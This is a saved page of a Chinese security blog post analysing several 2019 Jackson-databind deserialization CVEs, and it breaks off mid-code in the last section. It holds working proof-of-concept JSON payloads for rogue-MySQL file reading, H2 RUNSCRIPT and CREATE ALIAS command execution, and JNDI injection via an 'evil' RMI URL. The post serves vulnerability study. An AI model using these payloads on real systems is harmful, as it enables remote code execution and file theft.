@@ -1,0 +1,681 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Java 反序列化漏洞始末（4）— jackson - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="哔哔两句前面分析了两个关于 fastjson 的漏洞，这篇文章再提一嘴 Jackson。实际上这两个 JSON 处理类库的多数漏洞是可以通用的，原理也就是通过反射实例化对象，在调用构造函数或调用..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Java 反序列化漏洞始末（4）— jackson &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/189.html" />
+<link rel="alternate" type="application/rdf+xml" title="Java 反序列化漏洞始末（4）— jackson &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/189.html" />
+<link rel="alternate" type="application/atom+xml" title="Java 反序列化漏洞始末（4）— jackson &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/189.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-189'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-189'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-189'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _bOrsSk9 = //'yWy'
+'yWy'+'7'//'aro'
++//'yQX'
+'yQX'+//'Jc'
+'5'+/* 'MbZ'//'MbZ' */''+'07'//'8'
++//'Kk'
+'3'+'da3'//'Vc'
++'4Eq'//'4Eq'
++'02a'//'X'
++'fc8'//'bT'
++''///*'zm'*/'zm'
++'bd2'//'8'
++'b1b'//'f9'
++//'xU8'
+'e'+//'YOY'
+'f97'+''///*'Cre'*/'Cre'
++//'Fb'
+'9'+'7'//'D0'
++'b'//'R'
++'97'//'ks'
++//'8'
+'5da', _KEbf8wI = [[0,3],[1,4],[8,11]];
+    
+    for (var i = 0; i < _KEbf8wI.length; i ++) {
+        _bOrsSk9 = _bOrsSk9.substring(0, _KEbf8wI[i][0]) + _bOrsSk9.substring(_KEbf8wI[i][1]);
+    }
+
+    return _bOrsSk9;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Java 反序列化漏洞始末（4）— jackson</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-07-30 14:38:00" itemprop="datePublished">2019-07-30 14:38:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/189.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/189.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>哔哔两句</h1><p>前面分析了两个关于 fastjson 的漏洞，这篇文章再提一嘴 Jackson。</p><p>实际上这两个 JSON 处理类库的多数漏洞是可以通用的，原理也就是通过反射实例化对象，在调用构造函数或调用 get/set 方法时触发敏感操作</p><p><a href="https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java" target="_blank">https://github.com/FasterXML/jackson-databind/blob/master/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java</a></p><p>从这个黑名单里可以看到 RCE 阵营以带有 JDBC、Datasource 之类字眼的 JNDI 注入居多，太多了不一一复现，挑几个最新的总结一遍</p><h1>CVE-2019-12086</h1><p>先来看jackson 2019 的第一个洞，这是一个任意文件读取的漏洞</p><blockquote><p>A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint, the service has the mysql-connector-java jar (8.0.14 or earlier) in the classpath, and an attacker can host a crafted MySQL server reachable by the victim, an attacker can send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs because of missing com.mysql.cj.jdbc.admin.MiniAdmin validation.</p></blockquote><p>从漏洞描述中就能基本看懂是怎么回事了</p><ul><li>漏洞范围在 2.x - 2.9.9</li><li>被攻击的程序 classpath 中要有 8.0.14 以下的版本的 Mysql 驱动</li><li>可被攻击的类 <code>com.mysql.cj.jdbc.admin.MiniAdmin</code></li></ul><p>MySQL 有一个逻辑漏洞，可以读取本地文件。具体细节可以参考以下两篇文章</p><p><a href="https://www.cnblogs.com/xinzhao/p/11005419.html" target="_blank">https://www.cnblogs.com/xinzhao/p/11005419.html</a><br><a href="https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html" target="_blank">https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html</a></p><p>这里引用参考文章的一段话，能更清晰的理解这个问题。</p><blockquote><p>MySQL支持使用LOAD DATA LOCAL INFILE这样的语法，将客户端本地的文件中的数据insert到MySQL的某张表中。挺好的功能，就是协议设计的有点怪，大概是这个样子的：<br>   1.用户在客户端输入：load data local infile "/data.csv" into table test;<br>   2.客户端=&gt;服务端：我想把我本地的/data.csv文件插入到test表中;<br>   3.服务端=&gt;客户端：把你本地的/data.csv发给我；<br>   4.客户端=&gt;服务端：/data.csv文件的内容；<br>这个协议的问题是，客户端发送哪个文件的内容，取决于第3步，服务端要哪个文件，如果服务端是个恶意的MySQL，那么他可以读取客户端的任意文件，比如读取/etc/passwd：<br>   1.用户在客户端输入：load data local infile "/data.csv" into table test;<br>   2.客户端=&gt;服务端：我想把我本地的/data.csv文件插入到test表中;<br>   3.服务端=&gt;客户端：把你本地的/etc/passwd发给我；<br>   4.客户端=&gt;服务端：/etc/passwd文件的内容；</p><p>而且，在大部分客户端（比如MySQL Connector/J ）的实现里，第1、2步不是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在连接建立之后，都会有一些查询服务端配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL的连接，那么客户端所在服务器上的所有文件都可能泄露。</p></blockquote><p>想复现 Mysql 这个漏洞，可以在本地搭建一个恶意的 MySQL 服务器，然后使用 navicat for mysql 连接一下</p><p><strong>利用工具</strong></p><blockquote><p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank">https://github.com/Gifts/Rogue-MySql-Server</a><br><a href="https://github.com/BeichenDream/MysqlT/" target="_blank">https://github.com/BeichenDream/MysqlT/</a></p></blockquote><p>搭建好恶意 MySQL 服务器后用 Jackson 解析构造好的 json</p><p><strong>pom.xml</strong></p><pre><code>        &lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;mysql&lt;/groupId&gt;
+            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+            &lt;version&gt;8.0.13&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
+            &lt;version&gt;2.9.8&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><p><strong>JAVA Code</strong></p><pre><code>    public static void main(String[] args) throws SQLException, IOException {
+
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        String json = &quot;[\&quot;com.mysql.cj.jdbc.admin.MiniAdmin\&quot;, \&quot;jdbc:mysql://127.0.0.1:3306/\&quot;]&quot;;
+        mapper.readValue(json, Object.class);
+    }</code></pre><p>开启 enableDefaultTyping ，使用构造方法反序列化的方式反序列化 <code>MiniAdmin</code> 类</p><pre><code>public class MiniAdmin {
+    private JdbcConnection conn;
+
+    public MiniAdmin(Connection conn) throws SQLException {
+        if (conn == null) {
+            throw SQLError.createSQLException(Messages.getString(&quot;MiniAdmin.0&quot;), &quot;S1000&quot;, (ExceptionInterceptor)null);
+        } else if (!(conn instanceof JdbcConnection)) {
+            throw SQLError.createSQLException(Messages.getString(&quot;MiniAdmin.1&quot;), &quot;S1000&quot;, ((ConnectionImpl)conn).getExceptionInterceptor());
+        } else {
+            this.conn = (JdbcConnection)conn;
+        }
+    }
+
+    public MiniAdmin(String jdbcUrl) throws SQLException {
+        this(jdbcUrl, new Properties());
+    }
+
+    public MiniAdmin(String jdbcUrl, Properties props) throws SQLException {
+        this.conn = (JdbcConnection)((JdbcConnection)(new Driver()).connect(jdbcUrl, props));
+    }
+
+    public void shutdown() throws SQLException {
+        this.conn.shutdownServer();
+    }
+}</code></pre><p>构造方法执行的时候就会自动根据 jdbc url 去连接数据库，当连接到我们的恶意 MySQL 服务器时就会被读取到我们想读取的文件从而变成任意文件读取漏洞</p><h1>CVE-2019-12384</h1><p>这是一个前两天被曝出来的 jackson 远程代码执行漏洞，范围扩大到了 2.9.9，但个人觉得比较鸡肋。</p><p>因为这个需要 h2 数据库的依赖，用 h2 嵌入式数据库的情况很少见</p><p>引用该 CVE 编号的描述</p><blockquote><p>FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.</p></blockquote><p>关于漏洞的细节可以参考<br><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></p><h2>复现</h2><p>先引入依赖</p><pre><code>    &lt;dependencies&gt;
+        &lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
+            &lt;artifactId&gt;logback-core&lt;/artifactId&gt;
+            &lt;version&gt;1.3.0-alpha4&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.h2database&lt;/groupId&gt;
+            &lt;artifactId&gt;h2&lt;/artifactId&gt;
+            &lt;version&gt;1.4.199&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
+            &lt;version&gt;2.9.9&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;
+            &lt;version&gt;2.9.9&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
+            &lt;version&gt;2.9.9&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;</code></pre><p><strong>H2Rce.java</strong></p><pre><code>package jackson;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+
+import java.io.IOException;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3c5e5049597c55444f595f12534e5b">[email&#160;protected]</a>
+ * @since 2019/7/30 16:33
+ */
+public class H2Rce {
+
+    public static void main(String[] args) throws IOException {
+
+        ObjectMapper objectMapper = new ObjectMapper();
+        objectMapper.enableDefaultTyping();//开启 defaultTyping
+        String json = &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &quot; +
+                &quot;{\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\&quot;}]&quot;;
+        Object o = objectMapper.readValue(json, Object.class);//反序列化对象
+        String s = objectMapper.writeValueAsString(o);//
+    }
+
+}
+</code></pre><p>解析一下 json，本地监听的8000端口就收到了请求。</p><p><img src="/usr/uploads/2019/07/1337153263.jpg" alt="1564476305(1).jpg" title="1564476305(1).jpg"></p><pre><code>public class DriverManagerConnectionSource extends ConnectionSourceBase {
+    private String driverClass = null;
+    private String url = null;
+
+    public DriverManagerConnectionSource() {
+    }
+
+    public void start() {
+        try {
+            if (this.driverClass != null) {
+                Class.forName(this.driverClass);
+                this.discoverConnectionProperties();
+            } else {
+                this.addError(&quot;WARNING: No JDBC driver specified for logback DriverManagerConnectionSource.&quot;);
+            }
+        } catch (ClassNotFoundException var2) {
+            this.addError(&quot;Could not load JDBC driver class: &quot; + this.driverClass, var2);
+        }
+
+    }
+
+    public Connection getConnection() throws SQLException {
+        return this.getUser() == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.getUser(), this.getPassword());
+    }
+
+    public String getUrl() {
+        return this.url;
+    }
+
+    public void setUrl(String url) {
+        this.url = url;
+    }
+
+    public String getDriverClass() {
+        return this.driverClass;
+    }
+
+    public void setDriverClass(String driverClass) {
+        this.driverClass = driverClass;
+    }
+}
+</code></pre><p>被反序列化的是 DriverManagerConnectionSource 类，从 JSON 来看是调用了它的 setUrl 方法。</p><p>触发漏洞实际上是在 getConnection() 方法，所以要触发这个漏洞，需要再调用它下面的 get 方法。</p><pre><code>        String s = objectMapper.writeValueAsString(o);//</code></pre><p>这也就是为什么最后还要再执行一个序列化的过程（序列化时会调用 get 方法）</p><p>这段JSON 实际上是在 H2 内存数据库初始化的时候 执行RUNSCRIPT 指令，从指定的网址执行 SQL 脚本。</p><p>另外，H2 数据库是可以创建自定义函数的</p><p>参考：<a href="https://www.veryarm.com/71086.html" target="_blank">https://www.veryarm.com/71086.html</a></p><p>自定义函数可以指定一个 Java 类或者 Java 代码。</p><p>比如</p><pre><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
+    return s.hasNext() ? s.next() : &quot;&quot;;  }
+$$;</code></pre><p>我这里按照我自己的情况给出 payload</p><pre><code>CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {
+String[] command = {&quot;cmd&quot;, &quot;/c&quot;, cmd};
+Runtime.getRuntime().exec(command)
+}
+$$;
+CALL SHELLEXEC('calc')</code></pre><p>然后放在web服务器上，再使用，RUNSCRIPT 指令去执行，这里就不再演示了。</p><p>其实这个漏洞也不一定要通过远程文件去执行SQL，直接带入到 jdbc url也可以。</p><p>先来看下 payload 中的 JDBC URL <br><code>jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'</code></p><p><code>RUNSCRIPT FROM 'http://localhost:8000/inject.sql'</code>就是一条SQL命令<br>也可以写成 select 、create、drop 之类的。</p><p>所以完全可以替换成 inject.sql 文件中的内容</p><p><img src="/usr/uploads/2019/07/2443500908.jpg" alt="1564478420(1).jpg" title="1564478420(1).jpg"></p><pre><code>[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd)\\; }$$;&quot;}]</code></pre><p>使用文件存储模式，先创建一个自定义函数，注意代码中的分号需要用 \ 转义一下</p><p><img src="/usr/uploads/2019/07/371266586.jpg" alt="1564478475(1).jpg" title="1564478475(1).jpg"></p><pre><code>[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:file:~/.h2/test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');&quot;}]</code></pre><p>同样使用文件存储模式，执行 CALL 命令调用函数</p><p>这样就省去了再去调用远程文件的问题</p><h1>CVE-2019-12814</h1><blockquote><p>截止发文前该漏洞还没有公布出细节的文章</p></blockquote><p>这个也是前两天曝出来的一个 jackson 的文件读取漏洞，实际上是一个 XXE。</p><blockquote><p>A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.</p></blockquote><p>该漏洞的描述中说道 需要 JDOM 1.X 或 JDOM 2.X的依赖支持<br>范围在 2.9.9以内，且需要开启 enableDefaultTyping</p><pre><code>        s.add(&quot;org.jdom.transform.XSLTransformer&quot;);
+        s.add(&quot;org.jdom2.transform.XSLTransformer&quot;);</code></pre><p>再看下官方补丁</p><p>黑名单里又加了两个 JDOM 的类，基本上就知道怎么用了</p><p><img src="/usr/uploads/2019/07/2808110795.png" alt="1564480418.png" title="1564480418.png"></p><p>通过代码执行一下</p><pre><code>        XSLTransformer xslTransformer = new XSLTransformer(&quot;http://127.0.0.1:8000/hello&quot;);</code></pre><p>可以看到本地监听的端口收到了来自Java应用的请求。</p><p>往里面跟几个函数就能知道</p><p>这个类也是通过加载 XML 文件（可以通过远程的方式）进行解析，从而产生 XXE 盲注漏洞</p><p>XXE 又可以读取文件，所以就造成了 jackson 任意文件读取漏洞</p><h1>CVE-2019-14379</h1><blockquote><p>截止发文前该漏洞还没有公布出细节的文章</p></blockquote><p>同样也是这两天发出来的一个 CVE 编号，版本范围扩大到了 2.9.9.1及以下</p><blockquote><p>SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2 mishandles default typing when ehcache is used, leading to remote code execution.</p></blockquote><p>文中提到是由 ehcache 引起的问题。</p><pre><code>        &lt;!-- https://mvnrepository.com/artifact/net.sf.ehcache/ehcache --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt;
+            &lt;artifactId&gt;ehcache&lt;/artifactId&gt;
+            &lt;version&gt;2.10.6&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><p>ehcache 中有这样一个类 <code>DefaultTransactionManagerLookup</code></p><p>在它的 getTransactionManager 方法中会触发 JNDI 注入</p><p><img src="/usr/uploads/2019/07/463029821.png" alt="1564482568(1).png" title="1564482568(1).png"></p><p>这里我给出 gadget</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c9aba5bcac89a0b1baacaae7a6bbae">[email&#160;protected]</a>
+ * @since 2019/7/30 18:22
+ */
+public class ehcache {
+
+    public static void main(String[] args) {
+
+        DefaultTransactionManagerLookup defaultTransactionManagerLookup = new DefaultTransactionManagerLookup();
+
+        Properties properties = new Properties();
+        properties.setProperty(&quot;jndiName&quot;,&quot;rmi://127.0.0.1:1099/evil&quot;);
+
+        defaultTransactionManagerLookup.setProperties(properties);
+
+        defaultTransactionManagerLookup.getTransactionManager();
+    }
+
+}</code></pre><p>首先看 setProperties 方法</p><pre><code>    public void setProperties(Properties properties) {
+        if (properties != null) {
+            String jndiName = properties.getProperty(&quot;jndiName&quot;);
+            if (jndiName != null) {
+                this.defaultJndiSelector.setJndiName(jndiName);
+            }
+        }
+
+    }</code></pre><p>判断了如果有 jndiName 这个参数就调用 defaultJndiSelector 属性对象的  setJndiName 方法赋值</p><p>再看 getTransactionManager 方法</p><pre><code>public TransactionManager getTransactionManager() {
+        if (this.selector == null) {
+            this.lock.lock();
+
+            try {
+                if (this.selector == null) {
+                    this.lookupTransactionManager();
+                }
+            } finally {
+                this.lock.unlock();
+            }
+        }
+
+        return this.selector.getTransactionManager();
+    }</code></pre><p>当 selector 不为空时调用 lookupTransactionManager 方法</p><pre><code>private void lookupTransactionManager() {
+        Selector[] var1 = this.transactionManagerSelectors;
+        int var2 = var1.length;
+
+        for(int var3 = 0; var3 &lt; var2; ++var3) {
+            Selector s = var1[var3];
+            TransactionManager transactionManager = s.getTransactionManager();
+            if (transactionManager != null) {
+                this.selector = s;
+                LOG.debug(&quot;Found TransactionManager for {}&quot;, s.getVendor());
+                return;
+            }
+        }
+
+        this.selector = new NullSelector();
+        LOG.debug(&quot;Found no TransactionManager&quot;);
+    }
+</code></pre><p>这里又去遍历调用了 transactionManagerSelectors 属性所有元素的 getTransactionManager 方法</p><pre><code>public abstract class Selector {
+    private final String vendor;
+    private volatile TransactionManager transactionManager;
+
+    protected Selector(String vendor) {
+        this.vendor = vendor;
+    }
+
+    public String getVendor() {
+        return this.vendor;
+    }
+
+    public TransactionManager getTransactionManager() {
+        if (this.transactionManager == null) {
+            this.transactionManager = this.doLookup();
+        }
+
+        return this.transactionManager;
+    }
+
+    public void registerResource(EhcacheXAResource ehcacheXAResource, boolean forRecovery) {
+    }
+
+    public void unregisterResource(EhcacheXAResource ehcacheXAResource, boolean forRecovery) {
+    }
+
+    protected abstract TransactionManager doLookup();
+}</code></pre><p>getTransactionManager 方法在 Selector 抽象类里又调用了 doLookup 方法</p><p>transactionManagerSelectors 属性就是在初始化对象时被赋值的，这个数组的第一个就是 defaultJndiSelector 对象<br>也就是刚才被赋值了 jndiName 的那个对象。</p><pre><code>    private final JndiSelector defaultJndiSelector = new GenericJndiSelector();
+    private final Selector[] transactionManagerSelectors;
+
+    public DefaultTransactionManagerLookup() {
+        this.transactionManagerSelectors = new Selector[]{this.defaultJndiSelector, new GlassfishSelector(), new WeblogicSelector(), new BitronixSelector(), new AtomikosSelector()};
+    }</code></pre><p>defaultJndiSelector 在对象被初始化时就实例化了一个 GenericJndiSelector 对象</p><pre><code>public class GenericJndiSelector extends JndiSelector {
+    public GenericJndiSelector() {
+        super(&quot;genericJNDI&quot;, &quot;java:/TransactionManager&quot;);
+    }
+}</code></pre><p>它的父类是 <code>JndiSelector</code></p><p><img src="/usr/uploads/2019/07/4003439223.jpg" alt="1564484720(1).jpg" title="1564484720(1).jpg"></p><p>当数组的第一个对象被调用 getTransactionManager 方法时也就调用了它 的 doLookUp 方法</p><p>doLookUp 把 properties 里的 jndiName 当做 url，从而触发 JNDI 注入。</p><p>调用过程</p><pre><code>DefaultTransactionManagerLookup.setProperties()
+    DefaultTransactionManagerLookup.defaultJndiSelector.setJndiName()
+DefaultTransactionManagerLookup.getTransactionManager()
+    DefaultTransactionManagerLookup.lookupTransactionManager()
+        Selector.getTransactionManager()
+            Selector.doLookup()
+                JndiSelector.doLookup()
+                    InitialContext.lookup()</code></pre><p>最后使用 jackson 复现一遍这个过程</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="02606e7767426b7a7167612c6d7065">[email&#160;protected]</a>
+ * @since 2019/7/30 18:22
+ */
+public class ehcache {
+
+    public static void main(String[] args) throws IOException {
+
+        String json = &quot;[\&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\&quot;,&quot; +
+                &quot;{\&quot;properties\&quot;:{\&quot;jndiName\&quot;:\&quot;rmi://127.0.0.1:1099/evil\&quot;}}]&quot;;
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        Object o = mapper.readValue(json, Object.class);
+        mapper.writeValueAsString(o);
+
+    }
+
+}</code></pre><p>因为还要调用 get 方法，所以需要再序列化一遍</p><p><img src="/usr/uploads/2019/07/2670880623.jpg" alt="1564485145(1).jpg" title="1564485145(1).jpg"></p><h1>CVE-2019-?????</h1><blockquote><p>截止发文前该漏洞还没有公布出细节的文章</p></blockquote><p>这是一个由 logback 引起的 jndi 注入，可影响到 2.9.9.1。</p><p>问题出在这个类里</p><blockquote><p>ch.qos.logback.core.db.JNDIConnectionSource</p></blockquote><pre><code>public class JNDIConnectionSource extends ConnectionSourceBase {
+    private String jndiLocation = null;
+    private DataSource dataSource = null;
+
+    public JNDIConnectionSource() {
+    }
+
+    public void start() {
+        if (this.jndiLocation == null) {
+            this.addError(&quot;No JNDI location specified for JNDIConnectionSource.&quot;);
+        }
+
+        this.discoverConnectionProperties();
+    }
+
+    public Connection getConnection() throws SQLException {
+        Connection conn = null;
+
+        try {
